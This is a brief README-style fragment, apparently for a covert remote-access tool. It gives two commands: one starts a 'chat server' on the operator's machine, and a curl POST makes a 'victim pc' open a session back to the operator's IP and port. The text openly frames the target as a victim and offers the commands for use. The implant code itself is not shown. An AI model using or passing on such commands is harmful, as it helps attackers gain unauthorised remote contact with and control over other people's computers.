start chat server
```bash
python server.py <port>
```
start chat on victim pc
```bash
curl --request POST --url http://<ip>:9999/start-chat?address=<your_ip>&port=<port>
```